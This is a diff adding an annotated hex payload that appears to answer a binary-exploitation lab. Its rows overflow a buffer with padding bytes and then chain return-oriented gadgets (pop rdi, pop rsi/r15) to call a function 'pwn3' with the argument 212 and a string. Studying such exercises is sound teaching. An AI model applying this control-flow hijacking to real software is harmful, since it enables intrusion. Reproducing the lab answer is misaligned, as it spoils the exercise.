@@ -1,0 +1,37 @@
+Q. Your exploit explanation below.
+61 00 -- a (text) number and 0 byte for eval_token (still in tok) 
+ff ff ff ff ff ff -- padding for tok
+ff ff ff ff ff ff ff ff -- padding for tok
+ff ff ff ff ff ff ff ff -- padding for tok
+ff ff ff ff ff ff ff ff -- padding for tok
+ff ff ff ff ff ff ff ff -- padding for tok
+ff ff ff ff ff ff ff ff -- padding for tok
+ff ff ff ff ff ff ff ff -- padding for tok
+ff ff ff ff ff ff ff ff -- padding for tok
+ff ff ff ff ff ff ff ff -- padding for tok 
+ff ff ff ff ff ff ff ff -- padding for tok
+ff ff ff ff ff ff ff ff -- padding for tok
+ff ff ff ff ff ff ff ff -- padding for tok
+ff ff ff ff ff ff ff ff -- padding for tok
+ff ff ff ff ff ff ff ff -- padding for tok
+ff ff ff ff ff ff ff ff -- padding for tok
+34 36 40 00 00 00 00 00 -- address of gadget (pop rdi, ret)
+d4 00 00 00 00 00 00 00 -- argument 212
+32 36 40 00 00 00 00 00 -- address of gadget (pop rsi, pop r15, ret)
+b8 0f e8 ff ff 7f 00 00 -- address of string argument, pop rsi will encounter this
+ff ff ff ff ff ff ff ff -- pad for pop r15
+90 1c 40 00 00 00 00 00 -- address of pwn3
+70 68 33 33 72 6d 33 6e -- 2 last line is string ph33rm3n00bz in hex
+30 30 62 7a 00 ff ff ff 
+
+
+
+
+
+
+
+
+
+
+
+
